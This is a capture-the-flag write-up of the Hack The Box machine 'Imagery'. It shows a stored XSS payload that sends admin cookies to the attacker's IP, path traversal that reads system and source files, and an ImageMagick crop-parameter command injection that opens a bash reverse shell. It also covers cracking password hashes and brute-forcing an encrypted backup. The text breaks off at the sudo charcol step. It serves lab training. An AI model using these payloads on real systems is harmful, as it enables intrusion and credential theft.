---
title: "Imagery"
date: 2025-10-04 00:00 +0800
categories: [Boot2Root]
tags: [HTB,Medium]
image: https://github.com/user-attachments/assets/2e016a46-abce-404c-9870-47e4df66c919
---

<img width="695" height="235" alt="Screenshot 2025-10-10 022305" src="https://github.com/user-attachments/assets/2e016a46-abce-404c-9870-47e4df66c919" />


Chained a stored XSS and LFI to access source and credentials, injected a shell via an ImageMagick transform to get RCE, decrypted backups to obtain passwords, and abused the `charcol` backup tool to gain root.

## Recon

nmap scan result:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -p- -oN nmap-scan.txt 10.10.11.88 -v 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 22:53 +08
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
Initiating Ping Scan at 22:53
Scanning 10.10.11.88 [4 ports]
Completed Ping Scan at 22:53, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:53
Completed Parallel DNS resolution of 1 host. at 22:53, 0.01s elapsed
Initiating SYN Stealth Scan at 22:53
Scanning 10.10.11.88 [65535 ports]
Discovered open port 22/tcp on 10.10.11.88
Discovered open port 8000/tcp on 10.10.11.88
Completed SYN Stealth Scan at 22:53, 22.06s elapsed (65535 total ports)
Initiating Service scan at 22:53
Scanning 2 services on 10.10.11.88
Completed Service scan at 22:54, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.88.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.76s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.07s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Nmap scan report for 10.10.11.88
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.60 seconds
           Raw packets sent: 66137 (2.910MB) | Rcvd: 65565 (2.623MB)
```

Nmap found a live host at **10.10.11.88** with **SSH (port 22)** and **HTTP (port 8000)**.

- SSH (22): remote shell access if credentials or key are compromised
- HTTP (8000): Image Gallery running on Wekzeug/Python

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/1d281f78-b02d-4be3-8954-9dc23df56062" />

## Initial Enumeration

In the first reconnaissance phase we searched for known exploits using **searchsploit** based on the Nmap results, but found nothing useful.

Because there were no valid credentials or obvious SSH exploits, we focused on the web service on **port 8000**. 

We ran **dirsearch** to find hidden web paths, and at the same time did manual checks of the site.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ dirsearch -u imagery.htb:8000
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/_imagery.htb_8000/_25-10-09_00-09-12.txt

Target: http://imagery.htb:8000/

[00:09:12] Starting: 
[00:09:31] 401 -   59B  - /images                                           
[00:09:34] 405 -  153B  - /login                                            
[00:09:34] 405 -  153B  - /logout                                           
[00:09:40] 405 -  153B  - /register                                         
[00:09:46] 401 -   32B  - /uploads/dump.sql                                 
[00:09:46] 401 -   32B  - /uploads/affwp-debug.log
```

Nothing useful was found by **dirsearch**, and the same results were observed during our manual enumeration.

<img width="1719" height="854" alt="image 1" src="https://github.com/user-attachments/assets/be60d271-4c4f-4ae3-9c2d-a28d9c6ece44" />

unauthorized users would be able to register first before be able to logged in. Once logged in user given session token. 

<img width="1721" height="245" alt="417fbf5d-35e2-4e69-a52d-9d2cb67e9e53" src="https://github.com/user-attachments/assets/bca870f4-b394-4b82-99af-5f52e45effff" />

<img width="1706" height="775" alt="image 2" src="https://github.com/user-attachments/assets/ee811994-ab17-460d-b67a-d62576ec100a" />

Since authenticated users can upload images and report bugs, the application may be exposed to two main vulnerabilities: [**File Upload**](https://portswigger.net/web-security/file-upload) and [**Cross-Site Scripting (XSS)**](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss).** 

<img width="1715" height="773" alt="image 3" src="https://github.com/user-attachments/assets/1ec60a39-0ac2-425e-92c6-88ab170404c0" />
<img width="1716" height="778" alt="image 4" src="https://github.com/user-attachments/assets/d5993018-f5ff-4179-877b-cec2bc51fc48" />

### Session Hijacking

Upon review, the image upload function includes extension filtering, and bug reports are reviewed by an administrator before processing.

<img width="768" height="122" alt="558aded8-2f86-46db-a54f-d94fc25fab88" src="https://github.com/user-attachments/assets/171d6ce1-4df6-4e15-a317-bcad9c068ae5" />

I would say this could be [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored). So we might need to steal admin cookies and [hijack their session](https://www.invicti.com/learn/session-hijacking/).

Payload used: 

```bash
<img src=x onerror=this.src='http://10.10.14.19?cookie='+document.cookie>
```

Wait a few sec and **BOOM**: 

<img width="1697" height="848" alt="image 5" src="https://github.com/user-attachments/assets/c6100caa-a2b0-434f-92b0-8a6b6adffd78" />

Change the session cookie with our admin cookie and refresh, we are logged in as **Admin**

<img width="850" height="115" alt="4c8a7a43-286b-43ab-9c69-c66125d1612e" src="https://github.com/user-attachments/assets/a0cda018-e9ed-4182-9815-6c4777b159d7" />

<img width="858" height="350" alt="image 6" src="https://github.com/user-attachments/assets/96508184-9a55-4043-8606-05eb024547c2" />

<img width="850" height="435" alt="caaec4b1-b6f2-4969-8809-9a5aa2b5dd99" src="https://github.com/user-attachments/assets/33955cc7-f1c1-47e6-84ad-ee13d2c2cc6f" />

Downloaded the `admin@imagery.htb` and `testuser@imagery.htb` log while reviewing network requests.

<img width="643" height="349" alt="d8208736-8c00-4b5f-8b5c-c88e2f9677c3" src="https://github.com/user-attachments/assets/b1fbcd51-8c0f-407b-9f98-0094617f1d75" />

Admin log gave us nothing much

<img width="863" height="531" alt="image 7" src="https://github.com/user-attachments/assets/9852bb64-6840-4973-9446-6490782c9faf" />

### Path Traversal

But from testuser it gave us and error with requests `.../get_system_log?log_identifier=testuser@imagery.htb.log` 

We’ll do a sanity check first

```bash
http://imagery.htb:8000/admin/get_system_log?log_identifier=/etc/passwd
```

<img width="548" height="104" alt="image 8" src="https://github.com/user-attachments/assets/df6b4a43-8d4b-412e-a2df-38c4c9a93654" />

<img width="991" height="804" alt="image 9" src="https://github.com/user-attachments/assets/87a6597f-fd7b-4991-9fb9-c599f4078a42" />

Requesting `.../get_system_log?log_identifier=/etc/passwd` returned system file contents, proving a [Path Traversal](https://www.invicti.com/learn/local-file-inclusion-lfi/) vulnerability.

As a first step I fuzzed the target with **Burp Intruder** and the LFI list from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) to enumerate likely absolute paths. This allowed me to identify readable files and confirm Local File Inclusion candidates before attempting further validation and exploitation.

<img width="1452" height="729" alt="image 10" src="https://github.com/user-attachments/assets/ffe8b885-59f9-491a-bded-8a8f8150b856" />

As you can see, we now can fully understand the file structure for this web app `/home/web/web/system_logs/` i also did some research meanwhile let the burp running to learn more on flask application file structure 

<img width="1017" height="798" alt="image 11" src="https://github.com/user-attachments/assets/dab04c38-a185-449a-909c-d1259527b29f" />

```
my_flask_app/
├── app.py
├── config.py
├── requirements.txt
├── run.py
├── instance/
│   └── config.py
│── migrations/
│...
```

That’s mean, we can try with `/home/web/web/app.py` first. 

```
http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
```

<img width="550" height="115" alt="image 12" src="https://github.com/user-attachments/assets/de7d4eab-4d34-4032-a0df-d4805e328618" />

```python
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
```

From the highlighted source code, we can find that [app.py](http://app.py) are importing functions from other files that located in the same directory, here is the visualization:

```
app/
├── app.py
├── config.py
├── utils.py
├── api_auth.py
├── api_upload.py
├── api_manage.py
├── api_edit.py
├── api_admin.py
└── api_misc.py
```

## Shell as web

### finding creds from db

I would then proceed to download all those for further review, i would usually grep for any possible creds or db before diving to deep in source code review.

```bash
┌──(kali㉿kali)-[~/Downloads/app]
└─$ cat * | grep -Ri "pass"
api_admin.py:from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, _process_path_input
api_admin.py:    password = request_payload.get('password')
api_admin.py:    hashed_input_password = _hash_password(password)
api_admin.py:    if testuser_account['password'] == hashed_input_password:
api_admin.py:        return jsonify({'success': False, 'message': 'Invalid password for testuser.'}), 401
config.py:BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
config.py:BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')
api_edit.py:from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5
api_auth.py:from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input
api_auth.py:    password = request_payload.get('password')
api_auth.py:    if not username or not password:
api_auth.py:        return jsonify({'success': False, 'message': 'Email-id and password are required.'}), 400
api_auth.py:    hashed_password = _hash_password(password)
api_auth.py:        'password': hashed_password,
api_auth.py:    password = request_payload.get('password')
api_auth.py:    if not username or not password:
api_auth.py:        return jsonify({'success': False, 'message': 'Username and password are required.'}), 400
api_auth.py:        hashed_input_password = _hash_password(password)
api_auth.py:        if current_user_account['password'] == hashed_input_password:
api_auth.py:            _log_event(username, "Failed login attempt (invalid password).")
api_auth.py:            return jsonify({'success': False, 'message': 'Invalid username or password.'}), 401
api_auth.py:        return jsonify({'success': False, 'message': 'Invalid username or password.'}), 401
utils.py:def _hash_password(password):
utils.py:    return hashlib.md5(password.encode()).hexdigest()
api_manage.py:from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, _get_image_details

┌──(kali㉿kali)-[~/Downloads/app]
└─$ cat * | grep -Ri "db"
config.py:DATA_STORE_PATH = 'db.json'
api_upload.py:            'uploadedBy': session['username'],
api_upload.py:            'uploadedByDisplayId': session['displayId'],
api_edit.py:    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
api_edit.py:        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
api_edit.py:        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
api_edit.py:            'filename': output_filename_in_db,
api_edit.py:            'url': f'/uploads/{output_filename_in_db}',
api_edit.py:            'uploadedBy': session['username'],
api_edit.py:            'uploadedByDisplayId': session['displayId'],
api_edit.py:    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
api_edit.py:        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
api_edit.py:        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
api_edit.py:            'filename': output_filename_in_db,
api_edit.py:            'url': f'/uploads/{output_filename_in_db}',
api_edit.py:            'uploadedBy': session['username'],
api_edit.py:            'uploadedByDisplayId': session['displayId'],
api_edit.py:    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
utils.py:        'uploadedBy': image_entry.get('uploadedBy'),
utils.py:        'uploadedByDisplayId': image_entry.get('uploadedByDisplayId'),
api_manage.py:            if isinstance(img, dict) and img.get('uploadedBy') == username:
api_manage.py:        if img['id'] == image_id and img['uploadedBy'] == session['username']:
api_manage.py:        if img['id'] == image_id and img['uploadedBy'] == session['username']:
api_manage.py:        if img['id'] in image_ids and img['uploadedBy'] == session['username']:
```

`app_edit.py:`

```python
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
```

And from that, we would able to figure that there’s json.db 

```bash
app/
├── app.py
├── config.py
├── utils.py
├── api_auth.py
├── api_upload.py
├── api_manage.py
├── api_edit.py
├── api_admin.py
├── api_misc.py
└── json.db
```

And also based on `app_edit.py` the endpoints only work if the user has a valid session cookie (checks `session['username']` and `session['is_testuser_account']`). 

For the vuln part: the code builds a shell command by inserting user input (`x`, `y`, `width`, `height`) into a string and runs it with `shell=True`.

<img width="544" height="678" alt="image 13" src="https://github.com/user-attachments/assets/c1e4e6c2-a32b-447c-affe-50acb2b163ab" />

Meanings, we should logged in as `testuser@imagery.htb` to and inject reverse shell inside before the request is being send.

<img width="1704" height="778" alt="image 14" src="https://github.com/user-attachments/assets/29d43bdd-71f3-46b1-b9e7-f36baea7f55b" />

### md5 password hash crack

```bash
echo 2c65c8d7bfbca32a3ed42596192384f6 > hash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 0 hash --show

#2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

### reverse shell

<img width="1725" height="912" alt="image 15" src="https://github.com/user-attachments/assets/4890f270-e3f5-4926-959f-95c43b5f8a98" />

```json
"params":{"x":0,"y":0,"width":"210;bash -c 'bash -i >& /dev/tcp/10.10.14.19/1234 0>&1';","height":296}
```

and a little shell upgrade 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")';
# CTRL + Z 
stty raw -echo;fg;
export TERM=xterm
```

### /var/backups file

After playing around with our shell, we could find there’s a zipped file `web_20250806_120723.zip.aes` that is located at `/var/backup`

```bash
web@Imagery:~/web$ ls -lah /var/backup
total 22M
drwxr-xr-x  2 root root 4.0K Sep 22 18:56 .
drwxr-xr-x 14 root root 4.0K Sep 22 18:56 ..
-rw-rw-r--  1 root root  22M Aug  6  2024 web_20250806_120723.zip.aes
web@Imagery:~/web$ cp /var/backup/web_20250806_120723.zip.aes /tmp
web@Imagery:~/web$ cd /tmp/
web@Imagery:/tmp$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 ([http://0.0.0.0:8888/](http://0.0.0.0:8888/)) ...
10.10.14.19 - - [09/Oct/2025 05:37:04] "GET /web_20250806_120723.zip.aes HTTP/1.1" 200 -
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file web_20250806_120723.zip.aes
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

### **pyAesCrypt encrypted**

The file is `AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"` I then look for **pyAesCrypt** decrypt from online resources, We would first need to [bruteforce](https://github.com/dollarboysushil/pyAesCrypt-Decryptor-Brute-Forcer) the password before we can [crack](https://github.com/marcobellaccini/pyAesCrypt) the zip file.

```bash
┌──(.venv)(kali㉿kali)-[~/Desktop/Tools/pyAesCrypt-Decryptor-Brute-Forcer]
└─$ python3 dbs_pyaescrypt_decryptor.py -i ~/Downloads/web_20250806_120723.zip.aes -w /usr/share/wordlists/rockyou.txt -t 50
Using temporary directory: /tmp/pyaes_bruteforce____m5tyg
Workers: 50
[+] Output file exists: out.zip
[+] Password (reported by worker): bestfriends
[+] You can inspect with: file out.zip  && unzip -l out.zip
```

```bash
┌──(.venv)(kali㉿kali)-[~/Desktop/Tools/pyAesCrypt-Decryptor-Brute-Forcer]
└─$ ../pyAesCrypt/bin/pyAesCrypt -d ~/Downloads/web_20250806_120723.zip.aes -o ~/Downloads/web_20250806_120723.zip
Password: bestfriends
```

### unzipping the files

After inspecting, we should see an updated data from db.json 

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cd web/                                       

┌──(kali㉿kali)-[~/Downloads/web]
└─$ ls                                            
api_admin.py   api_upload.py  __pycache__
api_auth.py    app.py         system_logs
api_edit.py    config.py      templates
api_manage.py  db.json        utils.py
api_misc.py    env

┌──(kali㉿kali)-[~/Downloads/web]
└─$ cat db.json                                   
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

```bash
┌──(kali㉿kali)-[~/Downloads/web]
└─$ echo "01c3d2e5bdaf6134cec0a367cf53e535" > hash

┌──(kali㉿kali)-[~/Downloads/web]
└─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --force                                          
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
      For more information, see https://hashcat.net/faq/potfile

Started: Fri Oct 10 01:25:58 2025
Stopped: Fri Oct 10 01:25:58 2025

┌──(kali㉿kali)-[~/Downloads/web]
└─$ hashcat -m 0 hash --show
01c3d2e5bdaf6134cec0a367cf53e535:supersmash
```

## Shell as mark

### /usr/local/bin/charcol

While exploring the target as the user `mark`, we found a tool called **Charcol**. 

```bash
mark@Imagery:/$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
    
mark@Imagery:/$ sudo charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
